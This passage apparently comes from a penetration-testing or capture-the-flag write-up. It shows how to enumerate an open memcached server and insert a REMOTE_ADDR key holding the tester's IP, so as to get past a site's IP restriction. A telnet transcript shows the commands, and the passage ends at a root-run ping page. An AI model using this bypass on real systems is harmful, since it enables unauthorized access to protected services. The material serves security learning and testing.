memcached server runing with full accsess and permisions


### Memcached  Enumartion

[Memcached](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache)

we can understand that enter site is limite be ip and we see that REMOTE_ADDR value not found on key.

so lets try to add key with my ip address:

1. connecting using telnet 10.0.30.0 11211
2. add REMOTE_ADDR 0 0 10 
3. 10.10.0.10

```
$ telnet 10.0.30.0 11211
Trying 10.0.30.0...
Connected to 10.0.30.0.
Escape character is '^]'.
add REMOTE_ADDR 0 0 10
10.10.0.10
STORED

``` 

now we got access to other page with option to run ping

as we can see the proceess is running as root.
